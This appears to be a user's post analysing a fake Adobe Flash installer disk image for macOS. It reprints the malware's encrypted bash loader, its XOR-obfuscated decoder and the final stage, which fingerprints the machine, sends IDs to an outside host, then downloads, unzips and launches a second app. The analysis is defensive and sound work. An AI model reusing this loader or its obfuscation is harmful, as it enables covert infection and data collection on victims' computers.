I just found this thing in my downloads. No idea how it got there. Probably when browsing around with ad blocker off. Who knows? But wow is it clever.....

It's called Player.dmg and when you mount the image it looks like the Adobe Flash installer. Digging in a bit, the "executable" is just a bash script that runs this:

```bash
#!/bin/bash
cd "$(dirname "$BASH_SOURCE")"
fileDir="$(dirname "$(pwd -P)")"
eval "$(openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:3369351976 <"$fileDir"/Resources/enc)"
```

Now, I ain't no dummy, so I ain't eval'ing that but...

```bash
$ openssl enc -base64 -d -aes-256-cbc -nosalt -pass pass:3369351976 < ../Resources/enc

#!/bin/bash
_l() {
    _i=0;_x=0;
    for ((_i=0; _i<${#1}; _i+=2)) do
        __return_var="$__return_var$(printf "%02x" $(( ((0x${1:$_i:2})) ^ ((0x${2:$_x:2})) )) )"
        if (( (_x+=2)>=${#2} )); then ((_x=0)); fi
    done
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}

_m() {
    _v=$(base64 --decode <(printf "$1"));_k=$(xxd -pu <(printf "$2"));
    __return_var="$(xxd -r -p <(_l "$_v" "$_k"))"
    if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
}
_y="3369351976"
_t="MTAxMjE5NWI1YTViMWU1YjU2NDU1YjM5NTk0YTZjNDM1NDRiNDQ1ZjVjNWQwYjFiMTcxZDQyNGU2ODQwNTY0MTQ1MTkxZTQ1NDM1NjUzNDM1MDQ3NjA1YzQxNDY1ODU2NTkxZjExMzk0NTVjNDA0NjU4NTY1OTY5NTQ0NjVmNWQwZTE3MTUxMTQyNDM1YTU3NTE1YzVkMWMxMzMzNWE1NzUwNWI1ZjU3NTY2YTU4NWQwYTE0MTcxYjUzNWE1YjVhMTExNDU5MTYxMTE3MWU1MDVjNDc1NDVlMTcxYjQxNTcwNzE5MWU1NjExNzA3ODY2NWY1MjQyNWY1YzQ3NWM3YzRmNDY1NjQxNDI3ZDU2NDM1ODVhNTIxNjRmMTM1MTRiNTY0NTExMTQ1ODE2MTQxMTdmNzY2MzU5NTA0ZDUxNTk0MTVlNjM2YzdhNzExMzE5MGExNjExNmYxZTE3MTk2OTE4MWIxMDE2NGYxMzQ1NWM1NzE1MWM3YzE3MWI1ZDEzMTE0YTczMWIxYjFiMWY2ZDZkMTE2YjEyMWExNzcxNjUwNjc2NDMxNDFmMWIxMzQ5MTE0ZDQ1MTYxZTU3NTUxOTE0NmU2YTAzNDc0NDVhNWQ0MjAzNmU2ODE2MTAxNTNjNDY0MTVhMDQxMTVkNDU0ZDQ3MGMxYzFjNTc0OTVhMWI1MzUwNDM1NTVjNWM0NDVkNWE1YjUwNGQ1ODQ0MWQ1MDU5NTQxYzQ2NTUxNjA4NTUwZTUxNzE3NzRhNTc2MDA0MGExMDQ2MGUxMjU0NTI1NjU5NTA1OTUzNmM1YTUyMWY0MDA4MTU0YTUyNDU0MDVhNTk1NzZjNTI0NDUwNTMxMDVjMGUxMjU2NDA2YTQ3NWM0NTQ1NWE1YzU4MWY1MTA4MDIwYTAxMGYwMDA2MDcwMDA0MDMxMzMzNDI1ODQ5NWE0NjY2NDM1NDQyNGE0MDU5NDE1NzBiMWIwNTAyMDgwODAyMDUwYTA1MDUwYTA2MDMwOTBhMDQwMDBhMDAwMzA4MGEwMjA3MWIzZDQyNWU0MzY5NDk1MjQxNTkwNDE1MTIxYjVlNWQ0ZDU2NTg0MTE5MTg0MjVlNDMxOTYxNmI2ZDY5NjE2ZjZlNmI2YjFmMWIzOTU2NDQ0YjViMTYxZTU1MDY3NTEzMTcxNTRjNDU1YTExMTMwODE2NTc1MDQ3MTY1OTQzNWY1ZjE2MGIwZDEzMDAxOTA5MDgxNzQ3NWI0OTZjNDU1MDRkNWYzYzUyNDM0NjY2NTc1YzQzMDQxNTEyMWI1ZTVkNGQ1NjU4NDExOTFhNTIxMzFjNDI1NDQzMWE2OTYxNmY2ZTZiNmI2ZTYxMWExYTEzMzM0MjU4NDk1YTQ2MTkxZTY1MTExYjEzNDM1ZDQ5NWY0OTZjNDU1MDRhNDQ0MTVjNDE1MjFiMTMxNzE1NGQ1YTQ2NmM0MzU3NGQ1YjE3MTExNDUzMTYxMTE3NTc0OTQzNmE1NTUwNDUxNDEzMGQxNjE2NTc1MDQ3MTY1OTQzNWY1ZjE2MGIwZDEzMDAzMzQ1NWIxMzFlNTAxOTE3NDE1YzQ5Njg0NjUyNDc1ZTMzNTU1YzVkNWM2ODU4NTI1ZTUzMDQxMTExMTk1ZTQ1NTM0MzEzMWI1NDAyMTUxYzRmMTcxNDE5MWQ1NzQ5NDMxNzExMDUxZjVhNDAxMzFiMDgxMzE3MTU1ODQ3NDY2YzU3NWY0YjExMWMxODFiM2Q0MDVjNWY0MzU0NTY2YTVmNTg1YTUzMGUxMTEyMTE1NjU2NTk1NjE3MWI1ZDEzMTQxZDYzNjI3NTFiMTc0YTEzNDA1MzVkMTMxODc0MTkxYTU4MTMxNDQ1Nzk2ZDFkMWU2ZjU4NWE0NjVlNTM0YTFjNmU2ZjE2NmExZDFhMWMxODEzNzM2OTAwNzk0NzExMWExMTNjNGY1YzU5NDQ1NDUyNjk1ZDUyNWI1YzBlMTcxNTQyNDE1OTVmNDY1YjVjNmM1YjUwNTQ1MjE5MWMxMzE5MWMwMTA1NGMxYjNkNTU1YjVlNTk1ZDEzMWU0OTE5MTUxMjUyNDM0NjY2NTc1YzQzMWQ1MTVmNWY1NjY5NTc1MjU4NTQxNjc0NTk1ZDQ3NTM1NzQ3NDYxZTc0NTY1NTdjNjAxNDE2MTkzZjVlNDk1MjU4MTMxZTU3MTkxMTExNTA0OTQ3Njk1NzVhNDQxZDU1NWM1ZDVjNjg1ODUyNWU1MzFiMTMxODFjNTg0NTUxNDAxMzE0NGExMTE1MTMxZDQ0NTM0MDQwNWY1NjVkNmE1NjRjNWU1MjExMTMxNDFkNDU1YTVkNGM1YTUzNmM1ZDU3NTQ1NjE3"
eval "$(_m "$_t" "$_y")"
```

A chunk of self-evaluating code! I slightly modified the above to replace evals with echos (again, I'm no dummy):

```bash
$ diff -dw badscript_orig.sh badscript_changed.sh
8c8
<     if [[ "$3" ]]; then echo -n "$3='$__return_var'"; else echo -n "$__return_var"; fi
---
>     if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
14c14
<     if [[ "$3" ]]; then echo -n "$3='$__return_var'"; else echo -n "$__return_var"; fi
---
>     if [[ "$3" ]]; then eval "$3='$__return_var'"; else echo -n "$__return_var"; fi
18c18
< echo -n $(_m "$_t" "$_y")
---
> eval "$(_m "$_t" "$_y")"
```

Running the modified self-evaluating (and decoding) script and you get another bundle:

```bash
#!/bin/bash
os_version="$(sw_vers -productVersion)"
session_guid="$(uuidgen)"
machine_id="$(echo -n "$(ioreg -rd1 -c IOPlatformExpertDevice | grep -o '"IOPlatformUUID" = "\(.*\)"' | sed -E -n 's@.*"([^"]+)"@\1@p')" | tr -dc '[[:print:]]')"
url="http://api.bitcoordinator.com/sd/?c=bGNybQ==&u=$machine_id&s=$session_guid&o=$os_version&b=3369351976"
unzip_password="67915396335683369351976"
tmp_path="$(mktemp /tmp/XXXXXXXXX)"
curl -f0L "$url" >/dev/null 2>&1 >>$tmp_path
app_dir="$(mktemp -d /tmp/XXXXXXXX)/"
unzip -P "$unzip_password" "$tmp_path" -d "$app_dir" > /dev/null 2>&1 rm -f $tmp_path
file_name="$(grep -m1 -v "*.app" <(ls -1 "$app_dir"))"
volume_name="$(echo -n "$PWD" | sed -E -n 's@^(/Volumes/[^/]+)/.*@\1@p')"
volume_name="${volume_name// /%20}" chmod +x "$app_dir$file_name/Contents/MacOS"/* open -a "$app_dir$file_name" --args "s" "$session_guid" "$volume_name"
```

Just running enough to get the file package (and running `uuidgen` for `machine_id` so we're not leaking actual data) gets you a zipfile which, since we have a password, we can `unzip`. Note if you craft the URL without all the parameters, you get a 404 (again, clever).

This gets us _another_ .app (that also looks like Adobe Flash Installer), but this time it's an actual Mach-O executable. Since there is nothing of note in `strings` - they have debug symbols disabled - we uploaded the package to [Virus Total for analysis](https://www.virustotal.com/#/file/c609a53502e1496f4ed8a719abfde444593874ee8311a52d7af14bc98def99ab/detection)
